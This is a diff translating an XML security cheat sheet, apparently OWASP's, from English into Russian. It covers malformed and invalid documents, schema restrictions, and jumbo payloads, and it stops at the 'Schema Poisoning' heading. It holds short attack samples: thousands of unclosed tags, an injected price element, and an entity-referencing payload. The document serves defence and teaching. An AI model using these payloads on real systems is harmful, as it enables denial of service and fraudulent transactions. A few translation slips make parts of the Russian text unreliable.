@@ -1,37 +1,37 @@
-# XML Security Cheat Sheet
+# Шпаргалка по безопасности XML
 
-## Introduction
+## Вступление
 
-While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:
+Хотя спецификации для XML и XML schemas предоставляют вам инструменты, необходимые для защиты XML-приложений, они также содержат множество уязвимостей в системе безопасности. Они могут быть использованы для выполнения различных типов атак, включая поиск файлов, подделку запросов на стороне сервера, сканирование портов и грубый взлом. Эта шпаргалка поможет вам понять, как злоумышленники могут использовать различные возможности XML, используемые в библиотеках и программном обеспечении, используя два возможных способа атаки:
 
-- **Malformed XML Documents**: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
-- **Invalid XML Documents**: Exploiting vulnerabilities that occur when documents that do not have the expected structure.
+- **Некорректно оформленные XML-документы**: Использование уязвимостей, возникающих, когда приложения сталкиваются с неправильно оформленными XML-документами.
+- **Некорректные XML-документы**: Использование уязвимостей, возникающих, когда документы не имеют ожидаемой структуры.
 
-## Dealing with malformed XML documents
+## Работа с искаженными XML-документами
 
-### Definition of a malformed XML document
+### Определение неправильно сформированного XML-документа
 
- If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." **If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.** A malformed document can include one or more of the followng problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.
+Если XML-документ не соответствует определению правильно сформированного документа в спецификации W3C XML, то он считается "неправильно сформированным". **Если XML-документ неправильно сформирован, анализатор XML обнаружит неустранимую ошибку, он должен остановить выполнение, документ не должен подвергаться какой-либо дополнительной обработке, и приложение должно отобразить сообщение об ошибке.** Неправильно сформированный документ может содержать одну или несколько из следующих проблем: отсутствующий конечный тег, порядок расположения элементов в бессмысленной структуре, введение запрещенных символов и так далее.
 
-### Handling malformed XML documents
+### Обработка искаженных XML-документов
 
-**To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.** In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.
+**Для работы с искаженными документами разработчикам следует использовать XML-процессор, соответствующий спецификациям W3C и не требующий значительного дополнительного времени для обработки искаженных документов.** Кроме того, они должны использовать только правильно оформленные документы, проверять содержимое каждого элемента и обрабатывать только допустимые значения в пределах заранее определенных границ.
 
-#### Malformed XML documents require extra time
+#### Неправильно оформленные XML-документы требуют дополнительного времени
 
-**A malformed document may affect the consumption of Central Processing Unit (CPU) resources.** In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).
+**Некорректно оформленный документ может повлиять на потребление ресурсов центрального процессора (CPU).** В определенных сценариях время, необходимое для обработки некорректно оформленных документов, может быть больше, чем требуется для правильно оформленных документов. Когда это происходит, злоумышленник может использовать асимметричную атаку с потреблением ресурсов, чтобы воспользоваться большим временем обработки и вызвать отказ в обслуживании (DoS).
 
-**To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.** Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.
+**Чтобы оценить вероятность этой атаки, проанализируйте время, затрачиваемое на создание обычного XML-документа, и время, затрачиваемое на создание некорректной версии того же документа.** Затем подумайте, как злоумышленник мог бы использовать эту уязвимость в сочетании с атакой XML flood с использованием нескольких документов для усиления эффекта.
 
-### Applications Processing Malformed Data
+### Приложения, обрабатывающие искаженные данные
 
-**Certain XML parsers have the ability to recover malformed documents.** They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. **Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.**
+**Некоторые синтаксические анализаторы XML обладают способностью восстанавливать искаженные документы.** Им можно дать указание сделать все возможное, чтобы вернуть корректное дерево со всем содержимым, которое они смогут проанализировать, независимо от несоответствия документа спецификациям. **Поскольку не существует заранее определенных правил для процесса восстановления, подход и результаты этих анализаторов могут не всегда совпадать. Использование некорректно оформленных документов может привести к неожиданным проблемам, связанным с целостностью данных.**
 
-The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:
+Следующие два сценария иллюстрируют векторы атак, которые анализатор будет анализировать в режиме восстановления:
 
-#### Malformed Document to Malformed Document
+#### Искаженный документ к искаженному документу
 
-According to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:
+Согласно спецификации XML, строка `--` (с двойным дефисом) не должна встречаться в комментариях. При использовании режима восстановления xml и PHP следующий документ после восстановления останется прежним:
 
 ```xml
 <element>
@@ -41,9 +41,9 @@ According to the XML specification, the string `--` (double-hyphen) must not occ
 </element>
 ```
 
-#### Well-Formed Document to Well-Formed Document Normalized
+#### Правильно сформированный документ Нормализуется к правильно сформированному документу
 
-Certain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:
+Некоторые анализаторы могут рассмотреть возможность нормализации содержимого ваших разделов `CDATA`. Это означает, что они обновят специальные символы, содержащиеся в разделе `CDATA`, чтобы они содержали безопасные версии этих символов, хотя это и не требуется:
 
 ```xml
 <element>
@@ -51,7 +51,7 @@ Certain parsers may consider normalizing the contents of your `CDATA` sections. 
 </element>
 ```
 
-Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:
+Нормализация раздела `CDATA` не является общепринятым правилом для синтаксических анализаторов. Libxml может преобразовать этот документ в его каноническую версию, но, хотя он хорошо оформлен, его содержимое может считаться искаженным в зависимости от ситуации:
 
 ```xml
 <element>
@@ -59,9 +59,9 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
 </element>
 ```
 
-### Handling coercive parsing
+### Обработка принудительного синтаксического анализа
 
-**One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.** Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:
+**Одна из популярных принудительных атак в XML заключается в разборе глубоко вложенных XML-документов без соответствующих им конечных тегов. Идея состоит в том, чтобы заставить жертву использовать - и в конечном итоге истощить - ресурсы компьютера и вызвать отказ в обслуживании цели.** В отчетах о DoS-атаке в Firefox 3.67 сообщалось об использовании 30 000 элементов open XML без соответствующих им конечных тегов. Удаление закрывающих тегов упростило атаку, поскольку для достижения тех же результатов требуется всего половина размера правильно оформленного документа. Количество обрабатываемых тегов в конечном итоге привело к переполнению стека. Упрощенная версия такого документа выглядела бы примерно так:
 
 ```xml
 <A1>
@@ -71,19 +71,19 @@ Normalization of a `CDATA` section is not a common rule among parsers. Libxml co
     <A30000>
 ```
 
-## Violation of XML Specification Rules
+## Нарушение правил спецификации XML
 
-Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. **It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.**
+Манипулирование документами с использованием синтаксических анализаторов, которые не соответствуют спецификациям W3C, может привести к неожиданным последствиям. **Может возникнуть вероятность сбоев и/или выполнения кода, если программное обеспечение должным образом не проверяет, как обрабатывать некорректные структуры XML. Использование в программном обеспечении нечетких XML-документов может привести к такому поведению.**
 
-## Dealing with invalid XML documents
+## Работа с недопустимыми XML-документами
 
-**Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.** Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.
+**Злоумышленники могут вводить в документы неожиданные значения, чтобы воспользоваться преимуществами приложения, которое не проверяет, содержит ли документ допустимый набор значений.** Схемы задают ограничения, которые помогают определить, являются ли документы действительными, а действительный документ правильно сформирован и соответствует ограничениям схемы. Для проверки документа может использоваться более одной схемы, и эти ограничения могут отображаться в нескольких файлах, либо с использованием одного языка схемы, либо с учетом преимуществ различных языков схемы.
 
-The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.
+Чтобы избежать этих уязвимостей, рекомендуется, чтобы каждый XML-документ имел точно определенную XML-схему (не [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)), при этом каждая часть информации должна быть должным образом ограничена, чтобы избежать проблем, связанных с неправильной проверкой данных. Используйте локальную копию или заведомо исправный репозиторий вместо ссылки на схему, предоставленной в XML-документе. Кроме того, выполните проверку целостности файла XML-схемы, на который ссылается ссылка, учитывая возможность того, что репозиторий может быть скомпрометирован. В тех случаях, когда в XML-документах используются удаленные схемы, настройте серверы на использование только защищенных зашифрованных сообщений, чтобы злоумышленники не могли подслушивать сетевой трафик.
 
-### Document without Schema
+### Документ без схемы
 
-Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:
+Рассмотрим книготорговца, который использует веб-сервис через веб-интерфейс для совершения транзакций. XML-документ для транзакций состоит из двух элементов: значения `id`, связанного с товаром, и определенной `price`. Пользователь может ввести только определенное значение `id`, используя веб-интерфейс:
 
 ```xml
 <buy>
@@ -92,7 +92,7 @@ Consider a bookseller that uses a web service through a web interface to make tr
 </buy>
 ```
 
-**If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:
+**Если структура документа не контролируется, приложение может также обрабатывать различные правильно оформленные сообщения с непредвиденными последствиями. Предыдущий документ мог содержать дополнительные теги, влияющие на поведение базового приложения, обрабатывающего его содержимое**:
 
 ```xml
 <buy>
@@ -101,11 +101,11 @@ Consider a bookseller that uses a web service through a web interface to make tr
 </buy>
 ```
 
-Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.
+Обратите внимание, что значение 123 указано в качестве `id`, но теперь документ содержит дополнительные открывающие и закрывающие теги. Злоумышленник закрыл элемент `id` и присвоил фиктивному элементу `price` значение 0. Последним шагом для придания структуре правильной формы является добавление одного пустого элемента  `id`. После этого приложение добавит закрывающий тег для `id` и установит `price` равной 10. Если приложение обрабатывает только первые значения, указанные для идентификатора и значения value, без выполнения какого-либо контроля над структурой, это может принести пользу злоумышленнику, предоставив возможность купить книгу, фактически не платя за нее.
 
-### Unrestrictive Schema
+### Неограниченная схема
 
-**Certain schemas do not offer enough restrictions for the type of data that each element can receive.** This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:
+**Некоторые схемы не содержат достаточных ограничений для типа данных, которые может получать каждый элемент.** Это то, что обычно происходит при использовании [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); у него очень ограниченный набор возможностей по сравнению с типом ограничений, которые могут быть применены в XML-документах. Это может привести к появлению в приложении нежелательных значений в элементах или атрибутах, которые было бы легко ограничить при использовании других языков схем. В следующем примере "возраст" пользователя проверяется по встроенной схеме [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp):
 
 ```xml
 <!DOCTYPE person [
@@ -119,21 +119,21 @@ Notice again how the value 123 is supplied as an `id`, but now the document incl
 </person>
 ```
 
-The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.
+Предыдущий документ содержит встроенный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) с корневым элементом с именем `person`. Этот элемент содержит два элемента в определенном порядке: "имя", а затем `age`. Затем определяется элемент `name`, содержащий `PCDATA`, а также элемент `age`.
 
-After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element.
+После этого определения начинается формирование корректного XML-документа. Имя элемента содержит нерелевантное значение, но элемент `age` содержит миллион цифр. Поскольку нет никаких ограничений на максимальный размер элемента `age`, эта строка из миллиона цифр может быть отправлена на сервер для этого элемента.
 
-Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.
+Как правило, этот тип элементов должен содержать не более определенного количества символов и ограничиваться определенным набором символов (например, цифрами от 0 до 9, знаками + и -). Если не ввести соответствующие ограничения, приложения могут обрабатывать потенциально недопустимые значения, содержащиеся в документах.
 
-Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.
+Поскольку невозможно указать конкретные ограничения (максимальную длину для элемента "имя" или допустимый диапазон для элемента "возраст"), этот тип схемы увеличивает риск нарушения целостности и доступности ресурсов.
 
-### Improper Data Validation
+### Неправильная проверка данных
 
-**When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.**
+**Если схемы определены неточно и не содержат строгих правил, они могут привести к возникновению в приложении различных ситуаций. Результатом этого может стать раскрытие внутренних ошибок или документов, которые могут привести к неожиданным последствиям для функциональности приложения.**
 
-#### String Data Types
+#### Строковые типы данных
 
-Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:
+При условии, что вам необходимо использовать шестнадцатеричное значение, нет смысла определять это значение как строку, которая позже будет ограничена определенными 16 шестнадцатеричными символами. Чтобы проиллюстрировать этот сценарий, при использовании XML-шифрования некоторые значения должны быть закодированы с использованием base64 . Это определение схемы того, как должны выглядеть эти значения:
 
 ```xml
 <element name="CipherData" type="xenc:CipherDataType"/>
@@ -145,24 +145,24 @@ Provided you need to use a hexadecimal value, there is no point in defining this
  </complexType>
 ```
 
-The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.
+Предыдущая схема определяет элемент `CipherValue` как тип данных base64. В качестве примера, IBM WebSphere DataPower SOA Appliance допускает использование любого типа символов в этом элементе после допустимого значения base64 и будет считать его допустимым.
 
-The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.
+Первая часть этих данных должным образом проверена как значение base64, но остальные символы могут быть любыми другими (включая другие подэлементы элемента `cipherData`). Для элемента частично установлены ограничения, что означает, что информация, вероятно, тестируется с использованием приложения, а не предложенной типовой схемы.
 
-#### Numeric Data Types
+#### Числовые типы данных
 
-**Defining the correct data type for numbers can be more complex since there are more options than there are for strings.**
+**Определение правильного типа данных для чисел может быть более сложным, поскольку существует больше вариантов, чем для строк.**
 
-##### Negative and Positive Restrictions
+##### Негативные и позитивные ограничения
 
-XML Schema numeric data types can include different ranges of numbers. They can include:
+Числовые типы данных XML-схемы могут содержать различные диапазоны чисел. Они могут включать:
 
-- **negativeInteger**: Only negative numbers
-- **nonNegativeInteger**: Positive numbers and the zero value
-- **positiveInteger**: Only positive numbers
-- **nonPositiveInteger**: Negative numbers and the zero value
+- **negativeInteger**: Только отрицательные числа
+- **nonNegativeInteger**: Положительные числа и нулевое значение
+- **positiveInteger**: Только положительные числа
+- **nonPositiveInteger**: Отрицательные числа и нулевое значение
 
-The following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:
+В следующем примере документа определяется `id` продукта, `price` и `quantity`, которые находятся под контролем злоумышленника:
 
 ```xml
 <buy>
@@ -172,7 +172,7 @@ The following sample document defines an `id` for a product, a `price`, and a `q
 </buy>
 ```
 
-**To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**
+**Чтобы избежать повторения старых ошибок, может быть определена XML-схема, предотвращающая обработку неправильной структуры в тех случаях, когда злоумышленник хочет ввести дополнительные элементы.:**
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -188,11 +188,11 @@ The following sample document defines an `id` for a product, a `price`, and a `q
 </xs:schema>
 ```
 
-Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**
+Ограничение этого типа данных `quantity` целым числом позволит избежать появления неожиданных символов. Как только приложение получит предыдущее сообщение, оно может рассчитать окончательную цену, выполнив операцию `price*quantity`. **Однако, поскольку этот тип данных может допускать отрицательные значения, это может привести к отрицательному результату для учетной записи пользователя, если злоумышленник введет отрицательное число. Чтобы избежать этой логической уязвимости, вы, вероятно, захотите увидеть здесь положительное целое число вместо integer.**
 
-##### Divide by Zero
+##### Деление на ноль
 
-**Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash.** There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.
+**При использовании пользовательских значений в качестве знаменателей при делении разработчикам следует избегать использования нулевого числа. В случаях, когда для деления в XSLT используется нулевое значение, будет возникать ошибка `FOAR0001`. Другие приложения могут генерировать другие исключения, и программа может завершиться сбоем.** Существуют определенные типы данных для XML-схем, которые специально избегают использования нулевого значения. Например, в случаях, когда отрицательные значения и ноль не считаются допустимыми, схема может указывать тип данных `positiveInteger` для элемента.
 
 ```xml
 <xs:element name="denominator">
@@ -202,13 +202,13 @@ Limiting that `quantity` to an integer data type will avoid any unexpected chara
 </xs:element>
 ```
 
-The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.
+Элемент `denominator` теперь ограничен целыми положительными числами. Это означает, что допустимыми будут считаться только значения, превышающие ноль. Если вы увидите, что используется какой-либо другой тип ограничения, вы можете вызвать ошибку, если знаменатель равен нулю.
 
-##### Special Values: Infinity and Not a Number (NaN)
+##### Специальные значения: Бесконечность, а не число (NaN)
 
-The data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.
+Типы данных `float` и `double` содержат действительные числа и некоторые специальные значения: `-Infinity` или `-INF`, `NaN` и `+Infinity` или `INF`. Эти возможности могут быть полезны для выражения определенных значений, но иногда ими злоупотребляют. Проблема в том, что они обычно используются для выражения только вещественных чисел, таких как цены. Это распространенная ошибка, которая встречается в других языках программирования и не ограничивается только этими технологиями.
 
-Not considering the whole spectrum of possible values for a data type could make underlying applications fail. **If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:**
+Если не учитывать весь спектр возможных значений для типа данных, это может привести к сбою базовых приложений. **Если специальные значения `Infinity` и `NaN` не требуются и ожидаются только действительные числа, рекомендуется использовать тип данных `decimal`.:**
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -223,16 +223,15 @@ Not considering the whole spectrum of possible values for a data type could make
  </xs:element>
 </xs:schema>
 ```
+**Значение цены не вызовет никаких ошибок, если оно установлено на бесконечность или NaN, поскольку эти значения будут недопустимыми. Злоумышленник может воспользоваться этой проблемой, если эти значения разрешены.**
 
-**The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**
+#### Общие ограничения на передачу данных
 
-#### General Data Restrictions
-
-After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:
+После выбора соответствующего типа данных разработчики могут ввести дополнительные ограничения. Иногда допустимым считается только определенное подмножество значений в пределах типа данных:
 
 ##### Prefixed Values
 
-**Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in an XML schema.** The following example restricts the contents of the element month to 12 possible values:
+**Некоторые типы значений должны быть ограничены только определенными наборами: светофоры будут иметь только три типа цветов, доступны только 12 месяцев и т.д. Возможно, что в схеме установлены эти ограничения для каждого элемента или атрибута. Это наиболее подходящий сценарий для приложения с использованием списка разрешений: будут приниматься только определенные значения. В XML-схеме такое ограничение называется `enumeration (перечисление)`.** В следующем примере содержимое элемента month ограничено 12 возможными значениями:
 
 ```xml
 <xs:element name="month">
@@ -255,11 +254,11 @@ After selecting the appropriate data type, developers may apply additional restr
 </xs:element>
 ```
 
-By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.
+Ограничивая значение элемента month любым из предыдущих значений, приложение не будет манипулировать случайными строками.
 
-##### Ranges
+##### Диапазоны
 
-Software applications, databases, and programming languages normally store information within specific ranges. **Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.** The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:
+Программные приложения, базы данных и языки программирования обычно хранят информацию в определенных пределах. **При использовании элемента или атрибута в местах, где важны определенные размеры (чтобы избежать переполнения или недопотока), было бы логично проверить, считается ли допустимой длина данных.** Следующая схема может ограничить имя, используя минимальную и максимальную длину, чтобы избежать необычных сценариев:
 
 ```xml
 <xs:element name="name">
@@ -272,7 +271,7 @@ Software applications, databases, and programming languages normally store infor
 </xs:element>
 ```
 
-In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:
+В тех случаях, когда возможные значения ограничены определенной длиной (скажем, 8), это значение может быть указано следующим образом, чтобы оно было допустимым:
 
 ```xml
 <xs:element name="name">
@@ -284,9 +283,9 @@ In cases where the possible values are restricted to a certain specific length (
 </xs:element>
 ```
 
-##### Patterns
+##### Шаблоны
 
-Certain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. **When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:**
+Определенные элементы или атрибуты могут соответствовать определенному синтаксису. При использовании XML-схем вы можете добавить ограничения по `шаблонам`. **Если вы хотите убедиться, что данные соответствуют определенному шаблону, вы можете создать для него специальное определение. Хорошим примером могут служить номера социального страхования (SSN); в них должен использоваться определенный набор символов, определенная длина и определенный `шаблон`:**
 
 ```xml
 <xs:element name="SSN">
@@ -298,13 +297,13 @@ Certain elements or attributes may follow a specific syntax. You can add `patter
 </xs:element>
 ```
 
-Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.
+В качестве значений для SSN будут разрешены только числа в диапазоне от `000-00-0000` до `999-99-9999`.
 
-##### Assertions
+##### Утверждения
 
-**Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed.**
+**Компоненты утверждений ограничивают существование и значения связанных элементов и атрибутов в XML-схемах. Элемент или атрибут будут считаться действительными в отношении утверждения только в том случае, если результат теста равен true без возникновения какой-либо ошибки. Переменная `$value` может использоваться для ссылки на содержимое анализируемого значения.**
 
-The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:
+В приведенном выше разделе "Деление на ноль" говорилось о возможных последствиях использования типов данных, содержащих нулевое значение для знаменателей, и предлагался тип данных, содержащий только положительные значения. В противоположном примере допустимым считается весь диапазон чисел, кроме нуля. Чтобы избежать раскрытия потенциальных ошибок, значения можно было бы проверить с помощью `assertion`, запрещающего нулевое число:
 
 ```xml
 <xs:element name="denominator">
@@ -316,13 +315,13 @@ The *Divide by Zero* section above referenced the potential consequences of usin
 </xs:element>
 ```
 
-The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.
+Это утверждение гарантирует, что `denominator` не будет содержать нулевое значение в качестве допустимого числа, а также позволяет использовать отрицательные числа в качестве допустимого знаменателя.
 
-##### Occurrences
+##### Происшествия
 
-**The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.** Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`.
+**Последствия того, что не определено максимальное количество вхождений, могут быть хуже, чем последствия того, что может произойти при получении экстремального количества элементов для обработки.** Два атрибута определяют минимальные и максимальные ограничения: `minOccurs` и `maxOccurs`.
 
- The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:
+ Значением по умолчанию как для атрибутов `minOccurs`, так и для атрибутов `maxOccurs` является `1`, но для некоторых элементов могут потребоваться другие значения. Например, если значение является необязательным, оно может содержать значение `minOccurs`, равное 0, а если максимальное количество не ограничено, оно может содержать значение `maxOccurs`, равное `unbounded`, как в следующем примере:
 
 ```xml
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
@@ -343,21 +342,21 @@ The assertion guarantees that the `denominator` will not contain the value zero 
 </xs:schema>
 ```
 
-The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**
+Предыдущая схема включает корневой элемент с именем `operation`, который может содержать неограниченное количество элементов buy. Это распространенный вывод, поскольку разработчики обычно не хотят ограничивать максимальное количество вхождений. **Приложениям, использующим неограниченное количество вхождений, следует проверить, что происходит, когда они получают для обработки чрезвычайно большое количество элементов. Поскольку вычислительные ресурсы ограничены, следует проанализировать последствия и в конечном итоге использовать максимальное количество вместо `unbounded` значения.**
 
-### Jumbo Payloads
+### Jumbo пейлоады
 
-**Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.**
+**Отправка XML-документа объемом 1 ГБ требует всего секунды обработки сервером и может не рассматриваться в качестве атаки. Вместо этого злоумышленник будет искать способ минимизировать нагрузку на процессор и трафик, используемые для создания такого типа атак, по сравнению с общим объемом ресурсов процессора сервера или трафика, используемых для обработки запросов.**
 
-#### Traditional Jumbo Payloads
+#### Традиционная крупная полезная нагрузка
 
-**There are two primary methods to make a document larger than normal:**
+**Существует два основных способа увеличить размер документа по сравнению с обычным:**
 
-**- Depth attack: using a huge number of elements, element names, and/or element values.**
+**- Глубинная атака: использование огромного количества элементов, имен элементов и/или значений элементов.**
 
-**- Width attack: using a huge number of attributes, attribute names, and/or attribute values.**
+**- Атака по ширине: использование огромного количества атрибутов, имен атрибутов и/или значений атрибутов.**
 
-In most cases, the overall result will be a huge document. This is a short example of what this looks like:
+В большинстве случаев общим результатом будет огромный документ. Вот краткий пример того, как это выглядит:
 
 ```xml
 <SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
@@ -368,9 +367,9 @@ In most cases, the overall result will be a huge document. This is a short examp
  ...
 ```
 
-#### "Small" Jumbo Payloads
+#### "Малые" Jumbo пейлоады
 
-**The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.** The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:
+**Следующий пример представляет собой документ очень небольшого размера, но результаты его обработки могут быть аналогичны результатам обработки традиционных больших объемов пейлоадов.** Цель такой небольших пейлоадов заключается в том, что она позволяет злоумышленнику отправлять множество документов достаточно быстро, чтобы заставить приложение использовать большую часть или все доступные ресурсы:
 
 ```xml
 <?xml version="1.0"?>
@@ -380,17 +379,17 @@ In most cases, the overall result will be a huge document. This is a short examp
 <root>&file;</root>
 ```
 
-### Schema Poisoning
+### Заражение схемы
 
